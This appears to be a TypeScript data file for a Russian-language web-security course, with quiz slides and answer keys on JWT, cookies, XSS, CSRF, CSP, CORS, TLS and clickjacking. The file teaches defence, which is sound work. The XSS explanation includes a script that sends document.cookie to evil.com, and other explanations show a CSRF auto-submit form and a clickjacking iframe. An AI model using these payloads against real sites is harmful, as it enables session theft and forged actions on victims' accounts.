import type { SkillNode } from '../types';

export const SECURITY: SkillNode = {
  id: 'security',
  title: 'Безопасность веб-приложений',
  category: 'Security',
  description: 'JWT, cookies, XSS, CSRF, HTTPS/TLS, CORS, CSP, OAuth, clickjacking, хранение токенов, мониторинг ошибок.',
  iconName: 'Shield',
  lessons: [
    {
      id: 'auth-tokens',
      title: 'JWT, cookies и токены',
      xpReward: 10,
      slides: [
        // ✅ Theory #185 — Что такое токены JWT?
        {
          type: 'theory',
          title: 'JWT (JSON Web Token)',
          definition:
            'JWT — токен в формате Base64, содержащий информацию о пользователе. Состоит из трёх частей: Header (алгоритм), Payload (данные: sub, name, exp), Signature (подпись для проверки подлинности). Используется для stateless-аутентификации: сервер не хранит сессию, а проверяет подпись токена.',
          codeExample: `// Получение токена при логине:
const { token } = await fetch('/api/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ username, password })
}).then(r => r.json());

// Использование токена в запросах:
fetch('/api/profile', {
  headers: { 'Authorization': \`Bearer \${token}\` }
});`,
          keyTerms: [
            { term: 'Header', definition: 'Метаданные: алгоритм подписи (HS256, RS256) и тип (JWT)' },
            { term: 'Payload', definition: 'Данные: sub (ID пользователя), name, exp (время истечения), iat (время создания)' },
            { term: 'Signature', definition: 'Подпись: HMAC(header + payload, secret) — гарантирует целостность' },
          ],
        },
        {
          type: 'multiple-choice',
          question: 'Что такое токены JWT? Как их можно использовать для аутентификации пользователей?',
          options: [
            'JWT — это зашифрованный пароль пользователя, который хранится на сервере',
            'JWT — Base64-токен из трёх частей: Header (алгоритм), Payload (данные пользователя + exp), Signature (подпись). Для аутентификации: (1) пользователь логинится → сервер создаёт JWT, (2) клиент сохраняет токен, (3) при запросах отправляет в заголовке Authorization: Bearer <token>, (4) сервер проверяет подпись и exp',
            'JWT — это cookie, которая автоматически отправляется с каждым запросом',
            'JWT — это протокол шифрования данных, аналог HTTPS',
          ],
          correctIndex: 1,
          explanation: 'JWT = Header.Payload.Signature (разделены точками). Header: {"alg":"HS256","typ":"JWT"}. Payload: {"sub":"123","name":"John","exp":1700000000}. Signature: HMACSHA256(base64(header)+"."+base64(payload), secret). Stateless: сервер НЕ хранит сессию — всё нужное в самом токене. Сервер лишь проверяет подпись и срок. Уязвимости: нет отзыва (revocation) — если украли токен, он действует до exp.',
        },
        // ✅ Theory #186 — Что такое безопасные (Secure) и HttpOnly cookies?
        {
          type: 'multiple-choice',
          question: 'Что такое безопасные (Secure) и HttpOnly cookies?',
          options: [
            'Secure и HttpOnly — это два разных типа хранилищ в браузере',
            'Это флаги cookie: HttpOnly — cookie недоступна из JavaScript (document.cookie), защищает от XSS-кражи токенов. Secure — cookie передаётся только по HTTPS, защищает от перехвата по HTTP. Пример: Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict',
            'Secure cookies шифруют данные, HttpOnly cookies запрещают запись',
            'Эти флаги устарели — современные браузеры их игнорируют',
          ],
          correctIndex: 1,
          explanation: 'Set-Cookie: token=abc123; HttpOnly; Secure; SameSite=Strict. HttpOnly: document.cookie не видит эту cookie → XSS-скрипт не может её украсть. Secure: cookie отправляется ТОЛЬКО по HTTPS → нельзя перехватить через HTTP. SameSite=Strict: cookie не отправляется при запросах с других сайтов → защита от CSRF. Лучшая практика: session/auth токены ВСЕГДА ставить HttpOnly + Secure + SameSite.',
        },
        // ✅ Theory #189 — Access token и refresh token
        {
          type: 'multiple-choice',
          question: 'Что такое access token и refresh token, и зачем их разделять?',
          options: [
            'Access и refresh token — это одно и то же, просто разные названия',
            'Access token — короткоживущий (15-30 мин), для доступа к API. Refresh token — долгоживущий (дни/недели), для получения нового access token. Разделение: если access token украден — злоумышленник ограничен коротким сроком. Refresh token хранится безопасно (HttpOnly cookie), используется редко (только для обновления)',
            'Access token хранится на сервере, refresh token — в localStorage',
            'Refresh token используется для шифрования данных, access token — для дешифрования',
          ],
          correctIndex: 1,
          explanation: 'Зачем разделять: access token передаётся с каждым запросом → больше шансов утечки → делаем короткоживущим (15-30 мин). Refresh token используется редко (только при истечении access) → можно хранить безопаснее (HttpOnly cookie). Процесс: (1) логин → сервер даёт access + refresh, (2) access истёк → клиент отправляет refresh на /api/refresh → получает новый access, (3) refresh украден → сервер может его отозвать (revoke).',
        },
        // ✅ Theory #190 — Что такое OAuth?
        {
          type: 'multiple-choice',
          question: 'Что такое OAuth и в каких сценариях он используется?',
          options: [
            'OAuth — это способ шифрования паролей на сервере',
            'OAuth — протокол авторизации, позволяющий приложению получить доступ к ресурсам пользователя (Google, GitHub) БЕЗ передачи пароля. Сценарии: «Войти через Google», доступ к Google Drive из приложения, GitHub API. Пользователь даёт разрешение на сайте провайдера → приложение получает токен доступа',
            'OAuth — это библиотека для React для управления состоянием авторизации',
            'OAuth — это технология хранения паролей в зашифрованном виде',
          ],
          correctIndex: 1,
          explanation: 'OAuth 2.0 flow: (1) приложение перенаправляет на Google/GitHub, (2) пользователь логинится и даёт разрешения, (3) провайдер перенаправляет обратно с authorization code, (4) приложение обменивает code на access token, (5) использует token для API. Пароль пользователя НИКОГДА не передаётся приложению. Для SPA используется Authorization Code Flow с PKCE — дополнительная защита, так как SPA не может хранить client_secret.',
        },
      ],
    },
    {
      id: 'xss-csrf',
      title: 'XSS и CSRF атаки',
      xpReward: 10,
      slides: [
        // ✅ Theory #187 — Что такое межсайтовый скриптинг (XSS)?
        {
          type: 'theory',
          title: 'XSS (Cross-Site Scripting)',
          definition:
            'XSS — внедрение вредоносного JavaScript-кода на страницу, который выполняется в контексте браузера жертвы. Позволяет: украсть cookies/токены, выполнить действия от имени пользователя, перенаправить на фишинговый сайт.',
          keyTerms: [
            { term: 'Stored XSS', definition: 'Код сохраняется на сервере (в БД) и выполняется при каждом просмотре. Пример: вредоносный комментарий' },
            { term: 'Reflected XSS', definition: 'Код «отражается» в ответе сервера через URL-параметр. Пример: /search?q=<script>alert(1)</script>' },
            { term: 'DOM-based XSS', definition: 'Код выполняется на клиенте через DOM-манипуляции без участия сервера. Пример: innerHTML = location.hash' },
          ],
        },
        {
          type: 'multiple-choice',
          question: 'Что такое межсайтовый скриптинг (XSS)?',
          options: [
            'XSS — это атака на сервер через SQL-инъекции',
            'XSS — внедрение вредоносного JS-кода на страницу. Типы: Stored (код в БД, выполняется у всех), Reflected (код в URL, отражается в ответе), DOM-based (манипуляция DOM на клиенте). Позволяет: красть cookies/токены, выполнять действия от имени пользователя',
            'XSS — это протокол для защищённой передачи данных',
            'XSS — это ошибка CSS, вызывающая некорректное отображение страницы',
          ],
          correctIndex: 1,
          explanation: 'XSS (Cross-Site Scripting): злоумышленник внедряет <script> или обработчик события (onerror, onload) в страницу. Stored: комментарий <script>fetch("evil.com?c="+document.cookie)</script> сохраняется в БД и выполняется у каждого посетителя. Reflected: ссылка site.com/search?q=<script>... отправляется жертве. DOM-based: document.getElementById("x").innerHTML = location.hash — JS на странице сам вставляет вредоносный код из URL.',
        },
        // ✅ Theory #194 — Как можно защищаться от CSRF-атак?
        {
          type: 'multiple-choice',
          question: 'Как можно защищаться от CSRF-атак (Cross-Site Request Forgery)?',
          options: [
            'Достаточно использовать HTTPS — он защищает от CSRF',
            'Защита: (1) CSRF-токены — уникальный токен в каждой форме, сервер проверяет перед выполнением, (2) SameSite cookies (Strict/Lax) — запрещают отправку cookies при межсайтовых запросах, (3) проверка заголовка Origin/Referer, (4) использовать POST/PUT/DELETE для изменяющих операций (не GET)',
            'Нужно отключить cookies в браузере',
            'Достаточно обфускации JavaScript-кода',
          ],
          correctIndex: 1,
          explanation: 'CSRF: злоумышленник на evil.com создаёт форму, отправляющую POST на bank.com/transfer. Браузер жертвы прикрепляет cookies bank.com → запрос выполняется от имени жертвы. Защита: (1) CSRF-токен: <input type="hidden" name="csrf" value="random">, злоумышленник не знает токен. (2) SameSite=Strict: браузер НЕ отправляет cookies при запросе с evil.com на bank.com. (3) Проверка Origin: if (req.headers.origin !== "https://bank.com") → 403. (4) Не делать изменения через GET (GET уязвим через <img src="...">).',
        },
        // ✅ Theory #198 — Объясните атаку XSS и способы защиты от неё
        {
          type: 'multiple-choice',
          question: 'Объясните атаку межсайтового скриптинга (XSS) и способы защиты от неё.',
          options: [
            'XSS невозможна в современных браузерах — они автоматически защищены',
            'XSS — внедрение JS-кода через пользовательский ввод. Защита: (1) textContent вместо innerHTML, (2) экранирование HTML-сущностей (< → &lt;), (3) Content Security Policy (CSP) — запрет inline-скриптов, (4) HttpOnly cookies — скрипт не может прочитать document.cookie, (5) в React/Vue избегать dangerouslySetInnerHTML/v-html',
            'Достаточно валидации формы на клиенте',
            'XSS защищается только на стороне сервера, на клиенте ничего делать не нужно',
          ],
          correctIndex: 1,
          explanation: 'Защита от XSS многоуровневая: (1) textContent: div.textContent = userInput — автоматически экранирует HTML-теги. (2) Экранирование: < → &lt;, > → &gt;, " → &quot;. (3) CSP: Content-Security-Policy: script-src \'self\' — запрещает inline-скрипты и скрипты с чужих доменов. (4) HttpOnly cookies: даже если XSS сработал, document.cookie не вернёт session-токен. (5) React по умолчанию экранирует {userInput} — но dangerouslySetInnerHTML обходит защиту!',
        },
        // ✅ Theory #199 — Опишите атаку CSRF и способы защиты
        {
          type: 'multiple-choice',
          question: 'Опишите атаку межсайтовой подделки запроса (CSRF) и способы защиты от неё.',
          options: [
            'CSRF — это когда злоумышленник крадёт исходный код сайта',
            'CSRF: злоумышленник создаёт страницу с формой/img, отправляющей запрос на доверенный сайт. Браузер жертвы автоматически прикрепляет cookies → запрос выполняется от имени жертвы. Защита: CSRF-токены, SameSite cookies, проверка Origin, запрет изменяющих операций через GET',
            'CSRF возможна только через WebSocket-соединения',
            'CSRF защищается отключением JavaScript в браузере',
          ],
          correctIndex: 1,
          explanation: 'CSRF-атака пошагово: (1) Жертва авторизована на bank.com (есть session cookie). (2) Жертва заходит на evil.com. (3) На evil.com есть: <form action="bank.com/transfer" method="POST"><input name="to" value="attacker"></form><script>form.submit()</script>. (4) Браузер отправляет POST на bank.com с cookies жертвы. (5) bank.com видит валидную сессию → выполняет перевод. Защита: CSRF-token (злоумышленник не знает), SameSite=Strict (browser не пошлёт cookie).',
        },
        // ✅ Theory #202 — В чём разница между XSS и CSRF?
        {
          type: 'multiple-choice',
          question: 'В чём разница между XSS и CSRF?',
          options: [
            'XSS и CSRF — это одна и та же атака с разными названиями',
            'XSS: злоумышленник ВНЕДРЯЕТ код в доверенный сайт → код выполняется в браузере жертвы → крадёт данные. CSRF: злоумышленник ИСПОЛЬЗУЕТ авторизацию жертвы → заставляет браузер отправить запрос на доверенный сайт → выполняет действие от имени жертвы. XSS = инъекция кода, CSRF = эксплуатация доверия',
            'XSS работает на клиенте, CSRF — только на сервере',
            'XSS — для кражи данных, CSRF — для DDoS-атак',
          ],
          correctIndex: 1,
          explanation: 'XSS: доверие сайта к пользовательскому вводу → вредоносный JS выполняется в контексте сайта → доступ к DOM, cookies, localStorage. CSRF: доверие сервера к браузеру → сервер не различает «настоящий» запрос от подделки → выполняет действие. XSS: <script>steal(document.cookie)</script> → кража данных. CSRF: <form action="bank.com/transfer"> → действие от имени жертвы. Защита тоже разная: XSS → экранирование + CSP, CSRF → CSRF-токены + SameSite.',
        },
      ],
    },
    {
      id: 'https-cors-csp',
      title: 'HTTPS, CORS, CSP, SSL/TLS',
      xpReward: 10,
      slides: [
        // ✅ Theory #188 — Что такое HTTPS?
        {
          type: 'multiple-choice',
          question: 'Объясните, что такое HTTPS и чем он отличается от HTTP.',
          options: [
            'HTTPS — просто более быстрая версия HTTP',
            'HTTPS = HTTP + шифрование (SSL/TLS). Отличия: (1) шифрует данные между клиентом и сервером (логины, пароли, токены), (2) подтверждает подлинность сервера через SSL-сертификат, (3) защищает от атаки «человек посередине» (перехват данных). Использует: асимметричное шифрование для обмена ключом, затем симметричное для данных',
            'HTTPS работает только на платных серверах',
            'HTTPS — это протокол, который заменяет TCP/IP',
          ],
          correctIndex: 1,
          explanation: 'HTTP: данные передаются открытым текстом — логин, пароль, токены можно перехватить. HTTPS: (1) TLS handshake: браузер получает SSL-сертификат сервера с публичным ключом, (2) проверяет сертификат через CA (Certificate Authority), (3) генерирует сессионный ключ, шифрует его публичным ключом → отправляет серверу, (4) далее обе стороны используют симметричное шифрование (AES) — быстрое. Результат: данные зашифрованы, подлинность сервера подтверждена.',
        },
        // ✅ Theory #191 — Content Security Policy
        {
          type: 'multiple-choice',
          question: 'Что такое Content Security Policy (CSP)?',
          options: [
            'CSP — это JavaScript-библиотека для шифрования данных',
            'CSP — HTTP-заголовок, указывающий браузеру откуда можно загружать ресурсы. Директивы: script-src (скрипты), style-src (стили), img-src (изображения), connect-src (fetch/XHR). Значения: \'self\' (только свой домен), \'none\' (запретить). Блокирует inline-скрипты → основная защита от XSS',
            'CSP — это протокол сетевого уровня для маршрутизации пакетов',
            'CSP — это стандарт для хранения данных в IndexedDB',
          ],
          correctIndex: 1,
          explanation: 'Content-Security-Policy: default-src \'self\'; script-src \'self\' https://cdn.trusted.com; style-src \'self\' \'unsafe-inline\'. Браузер получает этот заголовок и БЛОКИРУЕТ загрузку ресурсов из неразрешённых источников. Ключевое: script-src \'self\' → запрещает inline-скрипты (<script>alert(1)</script> не выполнится) и скрипты с чужих доменов. Это мощная защита от XSS даже при наличии уязвимости в коде. frame-ancestors \'self\' → защита от clickjacking.',
        },
        // ✅ Theory #192 — Что такое CORS?
        {
          type: 'multiple-choice',
          question: 'Что такое CORS?',
          options: [
            'CORS — это атака на веб-приложение',
            'CORS (Cross-Origin Resource Sharing) — механизм, позволяющий серверу указать, с каких доменов разрешены запросы. Без CORS браузер блокирует запросы к другому origin. Сервер отвечает заголовком Access-Control-Allow-Origin. Для «сложных» запросов (PUT, DELETE, custom headers) браузер сначала шлёт preflight OPTIONS',
            'CORS — это CSS-свойство для позиционирования элементов',
            'CORS работает только с WebSocket, не с HTTP',
          ],
          correctIndex: 1,
          explanation: 'Same-Origin Policy (SOP): браузер запрещает запросы к другому origin (протокол+домен+порт). CORS ослабляет это ограничение: сервер отвечает Access-Control-Allow-Origin: https://mysite.com → браузер разрешает. Preflight (OPTIONS): для POST с Content-Type: application/json или custom headers браузер сначала шлёт OPTIONS-запрос. Сервер отвечает: Allow-Origin, Allow-Methods, Allow-Headers. Если разрешено → основной запрос. CORS защищает пользователей, не сервер.',
        },
        // ✅ Theory #193 — Какие HTTP заголовки полезны для безопасности?
        {
          type: 'multiple-choice',
          question: 'Какие типы HTTP заголовков могут быть полезны для обеспечения безопасности веб-приложений?',
          options: [
            'Заголовки безопасности настраиваются только в DNS, не на сервере',
            'Заголовки: Content-Security-Policy (CSP — контроль источников ресурсов), X-Frame-Options (DENY/SAMEORIGIN — защита от clickjacking), Strict-Transport-Security (HSTS — принудительный HTTPS), X-Content-Type-Options: nosniff (запрет MIME-sniffing), Referrer-Policy (контроль Referer). Плюс: Set-Cookie с HttpOnly, Secure, SameSite',
            'Для безопасности достаточно одного заголовка — Authorization',
            'HTTP заголовки не влияют на безопасность — важен только JavaScript-код',
          ],
          correctIndex: 1,
          explanation: 'Ключевые security-заголовки: (1) CSP — контроль загрузки ресурсов, блокировка inline-скриптов. (2) X-Frame-Options: DENY — запрет отображения в iframe (clickjacking). (3) HSTS (Strict-Transport-Security: max-age=31536000) — браузер запоминает и всегда использует HTTPS. (4) X-Content-Type-Options: nosniff — запрет браузеру «угадывать» MIME-тип (может исполнить файл как скрипт). (5) Referrer-Policy: no-referrer — не отправлять URL с чувствительными данными. (6) Cookie-флаги: HttpOnly, Secure, SameSite.',
        },
        // ✅ Theory #197 — Что такое SSL и TLS?
        {
          type: 'multiple-choice',
          question: 'Что такое SSL и TLS и какую роль они играют в безопасности веба?',
          options: [
            'SSL и TLS — это JavaScript-библиотеки для шифрования данных',
            'SSL/TLS — криптографические протоколы для шифрования соединения. SSL (устаревший) → заменён на TLS (актуальный). Роль: (1) шифруют данные между клиентом и сервером, (2) подтверждают подлинность сервера через сертификат, (3) защищают от перехвата и подмены данных. HTTPS = HTTP поверх TLS',
            'SSL — для шифрования, TLS — для сжатия данных',
            'SSL и TLS работают только на уровне приложения, не на транспортном',
          ],
          correctIndex: 1,
          explanation: 'SSL (Secure Sockets Layer) — первый протокол шифрования (версии 1.0-3.0, все устарели). TLS (Transport Layer Security) — наследник SSL (актуальный: TLS 1.2, 1.3). TLS handshake: (1) Client Hello → поддерживаемые шифры, (2) Server Hello + сертификат (публичный ключ от CA), (3) браузер проверяет сертификат, (4) обмен ключом → создание сессионного ключа, (5) симметричное шифрование данных. Результат: конфиденциальность (шифрование), целостность (MAC), аутентификация (сертификат).',
        },
      ],
    },
    {
      id: 'clickjacking-storage-monitoring',
      title: 'Clickjacking, хранение данных, мониторинг',
      xpReward: 10,
      slides: [
        // ✅ Theory #195 — Лучшие практики при работе с веб-хранилищем
        {
          type: 'multiple-choice',
          question: 'Лучшие практики при работе с веб-хранилищем (localStorage / sessionStorage)?',
          options: [
            'Можно хранить любые данные в localStorage — это безопасно',
            'Правила: (1) НИКОГДА не хранить токены/пароли/PII — уязвимо к XSS, (2) localStorage — для настроек (тема, язык), sessionStorage — для временных данных формы, (3) очищать при выходе (logout), (4) валидировать данные при чтении (JSON.parse может упасть), (5) для токенов использовать HttpOnly cookies',
            'sessionStorage безопаснее localStorage, поэтому можно хранить пароли',
            'localStorage шифрует данные автоматически',
          ],
          correctIndex: 1,
          explanation: 'localStorage/sessionStorage доступны из JavaScript → XSS-скрипт может прочитать ВСЁ. Поэтому: НЕЛЬЗЯ: JWT, session tokens, пароли, кредитные карты, PII. МОЖНО: тема (dark/light), язык (ru/en), фильтры, корзина (не критичные данные). Для токенов: HttpOnly cookies (JS не видит) + Secure (только HTTPS) + SameSite (защита от CSRF). sessionStorage: данные удаляются при закрытии вкладки, но всё равно уязвим к XSS в текущей вкладке.',
        },
        // ✅ Theory #196 — Clickjacking
        {
          type: 'multiple-choice',
          question: 'Как можно защититься от кликджекинг-атак (Clickjacking)?',
          options: [
            'Clickjacking невозможен в современных браузерах',
            'Защита: (1) заголовок X-Frame-Options: DENY (запрет iframe) или SAMEORIGIN (только свой домен), (2) CSP: frame-ancestors \'self\' (современная альтернатива), (3) JavaScript: if (window.top !== window.self) — проверка на iframe (ненадёжная). Clickjacking: злоумышленник накладывает невидимый iframe с вашим сайтом поверх своей кнопки',
            'Достаточно использовать HTTPS',
            'Clickjacking защищается только на стороне клиента через CSS',
          ],
          correctIndex: 1,
          explanation: 'Clickjacking: evil.com встраивает ваш сайт в iframe (opacity:0), кнопка «Получить приз» визуально совпадает с вашей кнопкой «Удалить аккаунт». Пользователь кликает по «призу» → на самом деле жмёт «Удалить». Защита серверная: X-Frame-Options: DENY → браузер не отобразит страницу в iframe. CSP: frame-ancestors \'self\' https://trusted.com → разрешить только свой домен и доверенный. JS-проверка (framebusting): ненадёжна, может быть заблокирована sandbox-атрибутом iframe.',
        },
        // ✅ Theory #200 — Что такое clickjacking и какие меры помогают?
        {
          type: 'multiple-choice',
          question: 'Что такое clickjacking и какие меры помогают от него защититься?',
          options: [
            'Clickjacking — это DDoS-атака на сервер через множество кликов',
            'Clickjacking — атака через невидимый iframe: злоумышленник накладывает iframe с целевым сайтом (opacity:0) поверх кнопки-приманки. Пользователь думает, что кликает по «Приз», а на деле — по «Удалить аккаунт». Защита: X-Frame-Options: DENY/SAMEORIGIN, CSP frame-ancestors, подтверждение опасных действий (модалка «Вы уверены?»)',
            'Clickjacking — это кража кликов через вредоносное ПО',
            'Защититься от clickjacking невозможно',
          ],
          correctIndex: 1,
          explanation: 'Clickjacking пошагово: (1) evil.com создаёт <iframe src="bank.com/settings" style="opacity:0; position:absolute"> (2) поверх — кнопка «Получить приз» точно в позиции кнопки «Удалить аккаунт» в iframe (3) пользователь кликает «Приз» → на самом деле кликает в iframe → действие на bank.com. Защита: (1) X-Frame-Options: DENY → браузер откажется рендерить в iframe, (2) CSP: frame-ancestors \'none\', (3) UX: подтверждение критических действий (двойной клик, ввод пароля).',
        },
        // ✅ Theory #201 — Управление сессией
        {
          type: 'multiple-choice',
          question: 'Опишите понятие управления сессией в контексте безопасности веб-приложений.',
          options: [
            'Управление сессией — это CSS-анимация для таймера бездействия',
            'Управление сессией: отслеживание авторизованного пользователя между запросами. Включает: (1) создание сессии при логине (генерация уникального ID/JWT), (2) передача через cookies/токены, (3) валидация на сервере при каждом запросе, (4) истечение (expiration), (5) инвалидация при выходе (logout). Безопасность: HttpOnly cookies, ротация session ID, защита от fixation',
            'Управление сессией нужно только для многопользовательских игр',
            'Сессии полностью заменены JWT — управлять ими не нужно',
          ],
          correctIndex: 1,
          explanation: 'Session management: (1) Создание: пользователь логинится → сервер создаёт session ID (случайная строка) или JWT → отправляет клиенту через Set-Cookie: session=abc123; HttpOnly; Secure. (2) Передача: браузер автоматически прикрепляет cookie к каждому запросу. (3) Валидация: сервер проверяет session ID в БД или подпись JWT. (4) Expiration: session timeout (30 мин бездействия), absolute timeout (8 часов). (5) Logout: удаление сессии на сервере + очистка cookie. Угрозы: session hijacking (кража cookie), session fixation (навязывание ID).',
        },
        // ✅ Theory #203 — DOM-based XSS
        {
          type: 'multiple-choice',
          question: 'Что такое DOM-based XSS?',
          options: [
            'DOM-based XSS — это когда сервер возвращает вредоносный HTML',
            'DOM-based XSS: атака происходит на клиенте, без участия сервера. JS-код читает данные из DOM-источника (location.hash, location.search, document.referrer) и вставляет в DOM через опасный «приёмник» (innerHTML, document.write, eval). Пример: innerHTML = location.hash → URL#<script>alert(1)</script>',
            'DOM-based XSS возможна только в Internet Explorer',
            'DOM-based XSS — это XSS, которая влияет только на CSS-стили',
          ],
          correctIndex: 1,
          explanation: 'DOM-based XSS отличается от Stored/Reflected: вредоносный код НИКОГДА не отправляется на сервер. JS на странице сам вставляет данные из URL в DOM. Источники (sources): location.hash, location.search, document.referrer, window.name, localStorage. Приёмники (sinks): innerHTML, outerHTML, document.write, eval, setTimeout(string). Пример: const q = new URL(location).searchParams.get("q"); div.innerHTML = q; → URL?q=<img onerror="alert(1)" src=x>. Защита: textContent вместо innerHTML, sanitize-html библиотеки.',
        },
        // ✅ Theory #204 — Как защититься от XSS?
        {
          type: 'multiple-choice',
          question: 'Как защититься от XSS?',
          options: [
            'Достаточно валидации формы на клиенте',
            'Многоуровневая защита: (1) textContent вместо innerHTML для вставки данных, (2) экранирование HTML-сущностей (< → &lt;), (3) CSP: script-src \'self\' — запрет inline-скриптов, (4) HttpOnly cookies — скрипт не может прочитать токен, (5) в React: не использовать dangerouslySetInnerHTML, (6) валидация и санитизация на сервере',
            'XSS невозможна в React — фреймворк автоматически защищает',
            'Достаточно обфусцировать JavaScript-код',
          ],
          correctIndex: 1,
          explanation: 'Защита от XSS: (1) Output encoding: textContent автоматически экранирует HTML. (2) Ручное экранирование: str.replace(/</g, "&lt;").replace(/>/g, "&gt;"). (3) CSP: Content-Security-Policy: script-src \'self\' → inline-скрипты блокируются, даже если XSS-уязвимость есть. (4) HttpOnly cookies: document.cookie не вернёт session — скрипт не сможет украсть. (5) React: {userInput} экранирует по умолчанию. dangerouslySetInnerHTML — обходит защиту, использовать ТОЛЬКО с санитизацией (DOMPurify). (6) Серверная валидация: ВСЕГДА, клиентская — дополнение.',
        },
        // ✅ Theory #205 — Что такое CORS и как его настроить на сервере?
        {
          type: 'multiple-choice',
          question: 'Что такое CORS и как его настроить на сервере?',
          options: [
            'CORS — это клиентская библиотека для обхода Same-Origin Policy',
            'CORS — механизм, позволяющий серверу указать разрешённые origin для запросов. Настройка: Access-Control-Allow-Origin: https://mysite.com, Access-Control-Allow-Methods: GET, POST, Access-Control-Allow-Headers: Content-Type, Authorization. Для credentials: Access-Control-Allow-Credentials: true (нельзя с Allow-Origin: *)',
            'CORS настраивается в package.json frontend-приложения',
            'CORS нужен только для GET-запросов',
          ],
          correctIndex: 1,
          explanation: 'CORS на сервере (Express): app.use((req, res, next) => { res.header("Access-Control-Allow-Origin", "https://mysite.com"); res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE"); res.header("Access-Control-Allow-Headers", "Content-Type, Authorization"); res.header("Access-Control-Allow-Credentials", "true"); next(); }). Preflight: для PUT/DELETE/custom headers браузер шлёт OPTIONS → сервер отвечает allowed methods/headers → браузер решает, посылать ли основной запрос. Allow-Origin: * нельзя с Allow-Credentials: true.',
        },
      ],
    },
    {
      id: 'security-advanced',
      title: 'Продвинутая безопасность',
      xpReward: 10,
      slides: [
        // ✅ Theory #206 — Какая угроза если cookie не помечать Secure?
        {
          type: 'multiple-choice',
          question: 'Какая угроза возникает, если cookie с токенами не помечать флагом Secure?',
          options: [
            'Никакой угрозы — Secure — устаревший флаг',
            'Без Secure cookie передаётся по HTTP (незашифрованный канал) → злоумышленник в той же сети (Wi-Fi кафе) может перехватить cookie через man-in-the-middle атаку → получает session/access token → полный доступ к аккаунту жертвы. С флагом Secure cookie отправляется ТОЛЬКО по HTTPS',
            'Без Secure cookie удаляется при закрытии браузера',
            'Без Secure cookie становится доступна через JavaScript',
          ],
          correctIndex: 1,
          explanation: 'Без Secure: браузер отправляет cookie и по http:// и по https://. Атака: (1) жертва в публичном Wi-Fi, (2) злоумышленник слушает трафик (Wireshark), (3) жертва заходит на http://bank.com (случайно или через redirect), (4) браузер отправляет session cookie открытым текстом, (5) злоумышленник перехватывает → session hijacking. С Secure: cookie отправляется ТОЛЬКО по https:// → трафик зашифрован → перехват бесполезен. HSTS (Strict-Transport-Security) дополнительно: браузер автоматически переключает HTTP→HTTPS.',
        },
        // ✅ Theory #207 — Заголовок X-Frame-Options
        {
          type: 'multiple-choice',
          question: 'Что такое заголовок X-Frame-Options?',
          options: [
            'X-Frame-Options — это CSS-свойство для управления iframe',
            'X-Frame-Options — HTTP-заголовок, контролирующий отображение страницы в iframe. Значения: DENY (запретить iframe полностью), SAMEORIGIN (разрешить только с того же домена). Защищает от clickjacking-атак. Современная альтернатива: CSP frame-ancestors',
            'X-Frame-Options — это атрибут HTML-тега <iframe>',
            'X-Frame-Options управляет анимацией перехода между страницами',
          ],
          correctIndex: 1,
          explanation: 'X-Frame-Options: DENY → страница НЕ отображается ни в каком iframe. X-Frame-Options: SAMEORIGIN → только если iframe на том же домене. Без заголовка: злоумышленник может встроить вашу страницу в прозрачный iframe на evil.com → clickjacking. Современный аналог: Content-Security-Policy: frame-ancestors \'self\' https://trusted.com — более гибкий (можно указать конкретные домены). В production ставить оба для совместимости со старыми браузерами.',
        },
        // ✅ Theory #208 — TLS в кибербезопасности
        {
          type: 'multiple-choice',
          question: 'Зачем нужен TLS в кибербезопасности и как он используется на сайте?',
          options: [
            'TLS нужен только для банковских сайтов',
            'TLS шифрует HTTP-трафик (HTTPS). Обеспечивает: (1) конфиденциальность — данные зашифрованы, (2) целостность — данные не изменены при передаче, (3) аутентификацию — сертификат подтверждает подлинность сервера. На сайте: устанавливается SSL/TLS-сертификат → весь трафик идёт по HTTPS → защита логинов, паролей, платежей',
            'TLS — протокол для сжатия данных при передаче',
            'TLS заменяет HTTP полностью — это отдельный протокол',
          ],
          correctIndex: 1,
          explanation: 'TLS (Transport Layer Security) — криптографический протокол поверх TCP. На сайте: (1) получаем SSL-сертификат (Let\'s Encrypt — бесплатно), (2) настраиваем сервер (nginx/Apache) для HTTPS, (3) добавляем HSTS → браузер запоминает HTTPS. TLS handshake: ClientHello → ServerHello+Certificate → KeyExchange → Encrypted Connection. Версии: TLS 1.0-1.1 (устарели), TLS 1.2 (минимум), TLS 1.3 (рекомендуется, быстрее handshake). Без TLS: пароли, токены, личные данные передаются открытым текстом.',
        },
        // ✅ Theory #209 — CSRF опасность и защита
        {
          type: 'multiple-choice',
          question: 'Чем CSRF опасен для приложения и что нужно сделать для защиты от CSRF?',
          options: [
            'CSRF не опасен — браузеры автоматически блокируют такие атаки',
            'CSRF опасен: злоумышленник заставляет браузер жертвы отправить авторизованный запрос (перевод денег, смена пароля, удаление данных). Защита: (1) CSRF-токен в каждой форме, (2) SameSite=Strict/Lax для cookies, (3) проверка Origin/Referer заголовка, (4) использовать POST для изменяющих операций, (5) подтверждение критических действий (ввод пароля)',
            'Достаточно перейти на JWT — CSRF невозможен с JWT',
            'CSRF опасен только для GET-запросов',
          ],
          correctIndex: 1,
          explanation: 'Чем CSRF опасен: выполняет действия от имени авторизованного пользователя БЕЗ его ведома. Банк: перевод денег, смена пароля, добавление админа. Соцсеть: публикация поста, смена настроек приватности. Защита комплексная: (1) CSRF-token: hidden field в форме, сервер проверяет → злоумышленник не знает токен. (2) SameSite=Strict: браузер НЕ шлёт cookie при запросе с другого домена. (3) Origin-check: сервер отклоняет запросы с чужих origin. (4) Re-authentication: для критических действий запрашивать пароль повторно.',
        },
        // ✅ Theory #210 — Где хранить access и refresh токен?
        {
          type: 'multiple-choice',
          question: 'Где безопаснее хранить access-токен и refresh-токен на клиенте: localStorage, sessionStorage или cookie? Какие компромиссы у каждого варианта?',
          options: [
            'Нет разницы — все варианты одинаково безопасны',
            'localStorage: доступен из JS → уязвим к XSS, данные бессрочные. sessionStorage: доступен из JS → уязвим к XSS, но только в текущей вкладке. Cookie (HttpOnly+Secure+SameSite): недоступна из JS → защита от XSS, автоматически отправляется → уязвима к CSRF (но SameSite защищает). Рекомендация: refresh token в HttpOnly cookie, access token в памяти (переменная)',
            'Лучше всего хранить оба токена в localStorage — это стандарт индустрии',
            'Токены не нужно хранить — их нужно запрашивать при каждом запросе',
          ],
          correctIndex: 1,
